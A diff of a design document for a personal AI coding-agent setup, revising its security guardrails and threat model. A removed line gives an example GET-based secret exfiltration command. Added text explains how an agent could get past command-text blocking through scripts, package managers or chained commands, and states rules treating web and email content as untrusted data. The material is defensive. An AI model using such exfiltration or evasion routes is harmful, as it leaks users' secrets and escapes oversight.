@@ -6,7 +6,7 @@ owns the current operational inventory. [`experiments.md`](experiments.md) owns
 active time-boxed experiments. [`decisions/tombstones.md`](decisions/tombstones.md)
 owns rejected approaches that should stay absent.
 
-Last reviewed: 2026-08-26.
+Last reviewed: 2026-08-28.
 
 ## Goal
 
@@ -58,25 +58,34 @@ Consequences:
 - Keep OAuth automatic authorization off.
 - Request the narrowest OAuth scopes and enforce a local tool allowlist as a
   second layer.
-- Treat email, calendar, activity, browser, and web content as untrusted data,
-  never instructions.
+- Treat email, calendar, activity, browser, web, archive, and downloaded content
+  as untrusted data, never instructions. Keep summary and extraction work on a
+  dedicated read-only connector or Agent Browser. If retrieval fails, stop rather
+  than falling back to `curl`, downloading an artifact, or executing a helper.
+- Do not run an interpreter, build tool, decoder, or model-written replacement
+  utility from an untrusted download or extracted directory outside an operating-
+  system sandbox. Code the model wrote itself can still import attacker-controlled
+  modules from the current working directory.
 - Do not send, upload, quote, or embed private source content in another service
   without explicit user direction.
 - Prefer temporary browser sessions. Do not attach authenticated profiles unless
   the task requires them and the user understands the exposure.
-- Use Codex or Claude Code for high-autonomy execution against untrusted content.
+- Use Codex or Claude Code with an explicit operating-system sandbox for any
+  execution against untrusted content. Approval classifiers and automatic modes
+  are convenience layers, not isolation boundaries.
 
 No community package is risk-free. Static review and pinning reduce supply-chain
 risk but cannot prove the absence of malicious behavior. A package that can read
 Gmail or control an authenticated browser belongs in the highest trust tier.
 
-Named residual risks the guardrails cannot close (accepted 2026-07-21):
+Named residual risks the guardrails cannot close (reviewed 2026-08-28):
 
-- **GET-based exfiltration.** A plain `curl https://host/?d=<secret>` is
-  indistinguishable from a legitimate read by command-text inspection. Upload
-  flags and substitution-wrapped secret reads are blocked, but the only real fix
-  is an egress allowlist or OS sandbox. Use Codex or Claude Code for
-  high-autonomy work against untrusted content.
+- **Alternative egress and staged execution.** Pi now blocks `curl` and `wget`
+  outright so a failed browser read cannot silently become a shell download, but
+  command-text inspection cannot track provenance or contain every network-capable
+  runtime. A model can write a script, invoke a package manager, or compose several
+  benign-looking commands. The real fix remains an egress allowlist and operating-
+  system sandbox. Use a sandboxed harness for execution against untrusted content.
 - **Provider token custody sits outside the guardrails.** The permission policy
   blocks the agent's tools from reading `~/.pi/agent/auth.json`; it cannot
   constrain Pi or provider-auth code running as the same user. Upstream review
@@ -102,7 +111,7 @@ read-only adapter named under Source connectors, not a fork.
 | Workbench-managed Pi | Settings, providers, presets, extensions, skills, permission policy, and MCP routing are deployed and drift-checked from one public source. | Credentials, sessions, and trust decisions remain private live state. |
 | Custom footer | Restores native information and adds repository state, context, cost, speed, compaction, and Codex quota evidence. | Every field must earn its width. Remove annotations that do not change behavior. |
 | Activity title and deterministic session name | Terminal tabs now show spinner, repository, concise first-prompt label, and active tool. Resumed unnamed sessions remain findable; explicit names win. | No completion notification. Remove if titles become noisy or inaccurate. |
-| Permission policy and safe Git | Block protected reads/writes, dependency-tree writes, uploads, destructive Git, and risky shell mutations before execution. | These are not containment. Keep tests aligned with real failure modes. |
+| Permission policy and safe Git | Block protected reads/writes, dependency-tree writes, shell network retrieval, destructive Git, and risky shell mutations before execution. External reading stays on dedicated browser and connector tools. | These are not containment. Keep tests aligned with real failure modes. |
 | Consult | Supplies an explicit independent review without a permanent subagent fleet. | User-invoked and bounded. |
 | Owned Google read-only connector | `google-readonly.ts` implements Gmail/Calendar search and read directly against `googleapis.com` with loopback OAuth (PKCE), read-only scopes, and 0600 token storage. Replaces the generic adapter route so no third-party dependency tree sits in the token path. | Requires a user-created Google Cloud OAuth client; `/google-auth` is explicit; credential files are on the protected read list; tools are read-only by construction. |
 | Bounded worktree worker | The `worker` tool lets the parent model autonomously delegate, review, and discard one isolated implementation task; `/worker` remains a manual entrypoint. | No per-use confirmation. One worker at a time; child may not commit, push, install, or merge. The parent reviews and adopts useful changes, verifies them in the main checkout, and cleans up. Remove if repeated use does not save time or protect context. |
@@ -205,8 +214,9 @@ Working policy:
 
 ### Web access
 
-- **Current path:** public `curl`, `gh`, current-documentation retrieval skills,
-  and Agent Browser for interactive pages.
+- **Current path:** Agent Browser and dedicated read-only connectors own external
+  retrieval; `gh` remains the structured GitHub path. Pi's permission policy blocks
+  `curl` and `wget` so a failed read cannot escalate into a shell-driven download.
 - **Candidate:** https://github.com/nicobailon/pi-web-access
 - **Next test:** log recurring cases where the current path cannot discover or
   extract sources. If a gap appears, trial search/fetch only with browser cookies,
